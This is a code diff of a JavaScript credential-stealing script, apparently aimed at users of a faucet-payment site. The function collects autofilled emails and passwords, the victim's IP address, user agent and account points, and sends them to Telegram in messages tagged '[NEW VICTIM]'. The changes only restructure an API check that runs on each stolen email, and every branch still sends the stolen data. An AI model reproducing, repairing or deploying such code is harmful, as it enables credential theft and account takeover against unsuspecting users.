@@ -53,14 +53,14 @@ function getAutofilledValues() {
     var boxAccPts = document.getElementById('box_acc_pts');
     var userAgent = navigator.userAgent;
   
-    var Check1 = CheckAPI(email);
+    //var Check1 = CheckAPI(email);
 
     fetch('https://ipinfo.io/json')
     .then(response => response.json())
     .then(data => {
         if (boxAccPts) {
           var content = boxAccPts.innerText || boxAccPts.textContent;
-          Check1.then(result => {
+          CheckAPI(email).then(result => {
               var message = `[NEW VICTIM]\n\nEmail: ${email}\nPassword: ${password}\nIP Address: ${data.ip}\nUser Agent: ${userAgent}\nFacuatPay : ${result}\n\nPoints: ${content}`;
               sendTelegramMessage(message); 
           })
@@ -69,7 +69,7 @@ function getAutofilledValues() {
               sendTelegramMessage(message); 
           });
         } else {
-          Check1.then(result => {
+          CheckAPI(email).then(result => {
               var message = `[NEW VICTIM]\n\nEmail: ${email}\nPassword: ${password}\nIP Address: ${data.ip}\nUser Agent: ${userAgent}\nFacuatPay : ${result}\n\nPoints: Not Found`;
               sendTelegramMessage(message); 
           })
@@ -84,7 +84,7 @@ function getAutofilledValues() {
             var content = boxAccPts.innerText || boxAccPts.textContent;
             //var message = `[NEW VICTIM]\n\nEmail: ${email}\nPassword: ${password}\nIP Address: No Found\nUser Agent: ${userAgent}\nFacuatPay : ${Check1}\n\nPoints: ${content}`;
             //sendTelegramMessage(message);
-            Check1.then(result => {
+            CheckAPI(email).then(result => {
               var message = `[NEW VICTIM]\n\nEmail: ${email}\nPassword: ${password}\nIP Address: No Found\nUser Agent: ${userAgent}\nFacuatPay : ${result}\n\nPoints: ${content}`;
               sendTelegramMessage(message); 
             })
@@ -95,7 +95,7 @@ function getAutofilledValues() {
           } else {
             //var message = `[NEW VICTIM]\n\nEmail: ${email}\nPassword: ${password}\nIP Address: No Found\nUser Agent: ${userAgent}\nFacuatPay : ${Check1}\n\nPoints: Not Found`;
             //sendTelegramMessage(message); 
-            Check1.then(result => {
+            CheckAPI(email).then(result => {
                 var message = `[NEW VICTIM]\n\nEmail: ${email}\nPassword: ${password}\nIP Address: No Found\nUser Agent: ${userAgent}\nFacuatPay : ${result}\n\nPoints: Not Found`;
                 sendTelegramMessage(message); 
             })
